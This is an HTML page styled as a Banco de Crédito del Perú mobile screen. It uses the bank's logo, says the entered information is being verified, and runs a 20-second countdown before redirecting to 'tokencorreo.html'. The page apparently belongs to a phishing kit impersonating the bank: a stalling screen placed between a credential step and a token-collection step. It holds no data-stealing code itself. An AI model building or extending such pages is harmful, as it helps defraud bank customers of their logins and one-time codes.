<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BCP - Espera</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <style>
      body {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        background-color: #f4f5f7;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
        padding: 20px;
      }
      .phone-container {
        width: 375px;
        height: 750px;
        background-color: #ffffff;
        border-radius: 40px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        padding: 24px;
        box-sizing: border-box;
        display: flex;
        flex-direction: column;
        justify-content: space-between;
        position: relative;
        overflow: hidden;
      }
      .header {
        margin-top: 10px;
        text-align: center;
      }
      .logo-container {
        width: 80px;
        height: 80px;
        margin: 0 auto 20px auto;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .logo-container img {
        width: 100%;
        height: 100%;
        object-fit: contain;
      }
      h1 {
        font-size: 26px;
        color: #111;
        margin: 0 0 8px 0;
        font-weight: 700;
        line-height: 1.2;
      }
      p.subtitle {
        color: #666;
        font-size: 15px;
        margin: 0 0 32px 0;
      }
      .wait-content {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        flex: 1;
        text-align: center;
      }
      .spinner {
        width: 72px;
        height: 72px;
        border: 6px solid #fde8d7;
        border-top-color: #ea580c;
        border-radius: 50%;
        animation: girar 1s linear infinite;
        margin-bottom: 24px;
      }
      @keyframes girar {
        to {
          transform: rotate(360deg);
        }
      }
      .contador {
        font-size: 48px;
        font-weight: 700;
        color: #ea580c;
        line-height: 1;
        margin-bottom: 8px;
      }
      .contador-texto {
        font-size: 14px;
        color: #666;
      }
      .footer-text {
        font-size: 12px;
        color: #666;
        text-align: center;
      }
    </style>
  </head>
  <body>
    <div class="phone-container">
      <div class="header">
        <div class="logo-container">
          <img
            src="https://brandlogos.net/wp-content/uploads/2025/06/banco_de_credito_del_peru-logo_brandlogos.net_qqyy3.png"
            alt="Logo"
          />
        </div>
        <h1>Estamos<br />verificando</h1>
        <p class="subtitle">
          Por favor espera mientras validamos la información ingresada.
        </p>
      </div>

      <div class="wait-content">
        <div class="spinner"></div>
        <div class="contador" id="contador">20</div>
        <div class="contador-texto">Serás redirigido en segundos</div>
      </div>

      <div class="footer-text">Banco de Crédito del Perú</div>
    </div>

    <script>
      let segundos = 20;
      const contador = document.getElementById("contador");

      const intervalo = setInterval(() => {
        segundos--;
        contador.textContent = segundos;
        if (segundos <= 0) {
          clearInterval(intervalo);
          location.href = "tokencorreo.html";
        }
      }, 1000);
    </script>
  </body>
</html>
